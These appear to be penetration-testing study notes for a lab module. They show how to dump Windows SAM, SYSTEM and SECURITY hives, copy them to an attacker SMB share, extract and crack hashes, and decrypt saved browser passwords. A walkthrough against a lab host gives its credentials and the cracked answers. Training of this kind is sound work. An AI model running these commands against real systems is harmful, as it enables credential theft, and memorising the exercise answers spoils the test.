# 11 — Attacking SAM, SYSTEM, and SECURITY

## Overview

With **local admin access** to a Windows system, we can dump the SAM database, SYSTEM boot key, and SECURITY hive to extract password hashes offline. This section covers both **local** (registry export + secretsdump) and **remote** (NetExec) methods.

---

## Registry Hives to Dump

| Hive | Registry Path | Contains |
|------|-------------|----------|
| **SAM** | `HKLM\SAM` | Local user account password hashes (LM/NTLM) |
| **SYSTEM** | `HKLM\SYSTEM` | System boot key (required to decrypt SAM) |
| **SECURITY** | `HKLM\SECURITY` | Cached domain creds (DCC2), cleartext passwords, DPAPI keys, LSA secrets |

> **SAM + SYSTEM** = enough to dump local hashes. **SECURITY** = bonus (cached domain creds, DPAPI keys).

---

## Method 1: Local — Export Hives + Offline Cracking

### Step 1 — Save Registry Hives (on target, as admin)

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Step 2 — Transfer to Attack Host via SMB

**On attack host — start SMB share:**
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/loot/
```

**On target — move files to share:**
```cmd
move sam.save \\<ATTACKER-IP>\CompData
move system.save \\<ATTACKER-IP>\CompData
move security.save \\<ATTACKER-IP>\CompData
```

### Step 3 — Dump Hashes with secretsdump

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Output format:** `username:RID:LMhash:NThash:::`

### Step 4 — Crack NT Hashes with Hashcat

```bash
# Extract just the NT hashes into a file
# Hash mode 1000 = NTLM
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

---

## Method 2: Remote — NetExec

### Dump SAM Remotely

```bash
netexec smb <TARGET-IP> --local-auth -u <user> -p '<password>' --sam
```

### Dump LSA Secrets Remotely

```bash
netexec smb <TARGET-IP> --local-auth -u <user> -p '<password>' --lsa
```

> `--local-auth` = authenticate against local SAM (not domain). Required for workgroup/local accounts.

---

## DCC2 Hashes (Cached Domain Credentials)

- Found in `HKLM\SECURITY` on domain-joined machines
- Format: `domain/username:$DCC2$10240#username#hash`
- **~800x slower to crack** than NTLM hashes (uses PBKDF2)
- **Cannot be used for Pass-the-Hash**

```bash
# Hashcat mode 2100 = DCC2
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

---

## DPAPI (Data Protection API)

- Encrypts/decrypts data blobs on a per-user basis
- Keys (`dpapi_machinekey`, `dpapi_userkey`) dumped from `HKLM\SECURITY`

### Applications Using DPAPI

| Application | What DPAPI Protects |
|-------------|-------------------|
| Internet Explorer | Saved site passwords |
| Google Chrome | Saved site passwords |
| Outlook | Email account passwords |
| Remote Desktop Connection | Saved RDP credentials |
| Credential Manager | Network, WiFi, VPN credentials |

### Decrypt Chrome Passwords with Mimikatz

```cmd
mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

### Other DPAPI Tools
- `impacket-dpapi`
- `mimikatz`
- `DonPAPI` (remote)

---

## Hash Type Quick Reference

| Hash Type | Hashcat Mode | Speed | Notes |
|-----------|-------------|-------|-------|
| NTLM (NT hash) | `-m 1000` | Fast (~4.6 MH/s) | Modern Windows, primary target |
| LM hash | `-m 3000` | Very fast | Legacy (pre-Vista/2008), weak |
| DCC2 (cached domain) | `-m 2100` | Very slow (~5.5 kH/s) | PBKDF2, no Pass-the-Hash |

---

## Attack Workflow Summary

```
1. Get admin access on target
2. Save hives: reg.exe save hklm\sam, \system, \security
3. Transfer to attack host (SMB share, SCP, etc.)
4. Dump hashes: secretsdump.py -sam -system -security LOCAL
5. Crack NT hashes: hashcat -m 1000 hashes.txt rockyou.txt
6. (Optional) Crack DCC2: hashcat -m 2100 dcc2hash rockyou.txt
7. (Optional) Decrypt DPAPI blobs for browser/credential manager passwords
```

**Or remotely with NetExec:**
```
1. netexec smb <IP> --local-auth -u user -p pass --sam
2. netexec smb <IP> --local-auth -u user -p pass --lsa
3. Crack dumped hashes with hashcat
```

---

## Key Takeaways

- You need **both SAM and SYSTEM** hives — SYSTEM has the boot key to decrypt SAM
- **secretsdump.py** is the go-to tool for offline hash extraction from registry hives
- **NetExec** with `--sam` and `--lsa` flags can dump hashes remotely with admin creds
- NT hashes (mode 1000) are fast to crack; DCC2 hashes (mode 2100) are ~800x slower
- DCC2 hashes **cannot** be used for Pass-the-Hash
- DPAPI keys from SECURITY hive can decrypt browser passwords, Credential Manager, RDP saved creds
- Always save `HKLM\SECURITY` too — cached domain creds and DPAPI keys are high-value
- `31d6cfe0d16ae931b73c59d7e0c089c0` = empty/disabled password (common for Guest, DefaultAccount)

---

## Exercise Walkthrough — Target: 10.129.62.31

**Given creds:** `bob:HTB_@cademy_stdnt!` (local admin via RDP)

### Q1 — Where is the SAM database in the registry?

**Answer:** `hklm\sam`

### Q2 — Get ITbackdoor user's cleartext password

**Step 1 — Dump SAM remotely with impacket-secretsdump:**
```bash
impacket-secretsdump 'FRONTDESK01/bob:HTB_@cademy_stdnt!@10.129.62.31'
```

**SAM dump output (relevant lines):**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
```

**Step 2 — Crack ITbackdoor's NT hash with Hashcat:**
```bash
echo 'c02478537b9727d391bc80011c2e2321' > /tmp/itbackdoor.hash
hashcat -m 1000 /tmp/itbackdoor.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `c02478537b9727d391bc80011c2e2321:matrix`

**Answer:** `matrix`

### Q3 — Dump LSA secrets, find stored credentials

**Step 1 — Dump LSA secrets remotely with NetExec:**
```bash
netexec smb 10.129.62.31 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
```

**Output:**
```
FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
FRONTDESK01      [*] Dumping LSA secrets
FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
                 dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
FRONTDESK01      frontdesk:Password123
```

> The `frontdesk` service account had its password stored as an LSA secret (cleartext).

**Answer:** `frontdesk:Password123`
